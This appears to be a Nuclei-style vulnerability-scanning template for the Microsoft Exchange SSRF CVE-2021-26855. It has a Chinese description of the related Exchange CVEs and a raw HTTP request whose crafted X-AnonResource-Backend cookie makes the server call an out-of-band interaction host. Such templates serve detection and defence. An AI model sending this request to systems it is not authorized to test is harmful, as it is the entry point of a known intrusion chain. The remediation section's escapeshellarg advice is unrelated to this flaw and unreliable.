id: CVE-2021-26855
info:
  name: Microsoft Exchange Server SSRF Vulnerability
  author:
  - l0ne1y
  description: |-
    Microsoft Exchange Server 远程执行代码漏洞
    Exchange Server 是微软公司的一套电子邮件服务组件，是个消息与协作系统。2021年03月3日，微软官方发布了Microsoft Exchange安全更新，披露了多个高危严重漏洞，其中：

    1、在 CVE-2021-26855 Exchange SSRF漏洞中，攻击者可直接构造恶意请求，以Exchange server的身份发起任意HTTP请求，扫描内网，并且可获取Exchange用户信息。该漏洞利用无需身份认证。

    2、在 CVE-2021-26857 Unified Messaging service 反序列化漏洞中，攻击者可构造恶意请求，触发反序列化漏洞，从而执行任意代码。成功利用该漏洞需要Exchange administrator权限，或需要配合其他漏洞。

    3、在 CVE-2021-26858 / CVE-2021-27065 Exchange 任意文件写入漏洞中，攻击者可结合CVE-2021-26855 SSRF漏洞，或提供正确的administrator凭证，构造恶意请求，在系统上写入任意文件。
  severity: critical
  remediation: |-
    官方修复建议：
    微软官方已针对该批漏洞发布相关安全更新补丁，可按照以下链接进行升级：
    CVE-2021-26855 https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855

    临时修复建议：
    <br/>1、在执行涉及到可以将字符串作为代码执行的函数时，需要严格验证用户传递的参数，同时尽量避免用户控制参数。<br/>2、使用escapeshellarg函数处理相关参数。Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\\’”，双引号“””会被转义为“\\””，分号“;”会被转义为“\\;”，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。
requests:
- matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  raw:
  - |
    GET /owa/auth/x.js HTTP/1.1
    Host: {{Hostname}}
    Cookie: X-AnonResource=true; X-AnonResource-Backend={{interactsh-url}}/ecp/default.flt?~3;
